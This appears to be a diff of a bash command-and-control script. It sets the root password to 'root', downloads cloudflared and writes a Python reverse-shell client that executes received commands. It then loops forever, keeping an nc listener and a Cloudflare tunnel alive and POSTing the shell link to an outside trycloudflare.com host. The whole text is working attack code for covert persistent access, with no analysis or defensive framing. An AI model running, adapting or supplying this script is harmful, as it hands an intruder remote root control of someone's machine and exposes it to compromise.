@@ -1,16 +1,22 @@
 #!/bin/bash
-# 1. Re-assert Root Control
+# 1. Reset Root
 echo "root:root" | sudo chpasswd
 
-# 2. Deploy the Persistent Client (Only if missing)
+# 2. Setup Cloudflared
+if [ ! -f /tmp/cloudflared ]; then
+    curl -L --output /tmp/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
+    chmod +x /tmp/cloudflared
+fi
+
+# 3. The "Sentinel" Python C2 Client
 cat <<EOF > /tmp/c2_client.py
 import socket, os, subprocess, time
 def connect():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            # Ensure this matches your Mac's listener address/port
-            s.connect(('merchandise-angeles-jade-stud.trycloudflare.com', 8080))
+            # Connecting to the LOCAL tunnel port
+            s.connect(('127.0.0.1', 4444))
             while True:
                 s.send((os.getcwd() + " # ").encode())
                 data = s.recv(1024).decode("utf-8").strip()
@@ -20,17 +26,24 @@ def connect():
                 s.send(stdout + stderr)
             s.close()
         except:
-            time.sleep(10) # Wait 10s before reconnecting to save resources
+            time.sleep(5)
 if __name__ == "__main__":
     connect()
 EOF
 
-# 3. INFINITE PROCESS PREVENTION (The Guard)
-# Checks if the script is already running to avoid "Process Fork Bombing"
-if ! pgrep -f "python3 /tmp/c2_client.py" > /dev/null; then
-    nohup python3 /tmp/c2_client.py > /dev/null 2>&1 &
-    disown
-    echo "[*] Sentinel: New C2 process started."
-else
-    echo "[!] Sentinel: C2 process already active. Skipping duplicate."
-fi
+# 4. Start the Loop: Shell -> Tunnel -> Your Mac
+nohup bash -c "while true; do
+    # Ensure local C2 listener is ready
+    if ! pgrep -f 'nc -lkp 4444' > /dev/null; then
+        nohup nc -lkp 4444 -e /usr/bin/python3 /tmp/c2_client.py > /dev/null 2>&1 &
+    fi
+    # Ensure Tunnel is active
+    if ! pgrep -f 'tcp://localhost:4444' > /dev/null; then
+        nohup /tmp/cloudflared tunnel --no-autoupdate --url tcp://localhost:4444 > /tmp/shell.log 2>&1 &
+    fi
+    sleep 20
+    # Send the real Shell Link to your Mac
+    LINK=\$(grep -o 'tcp://[-0-9a-z]*\.trycloudflare.com:[0-9]*' /tmp/shell.log | head -n 1)
+    curl -s -X POST -d \"REAL_SHELL: \$LINK\" https://merchandise-angeles-jade-stud.trycloudflare.com
+    sleep 60
+done" > /dev/null 2>&1 &
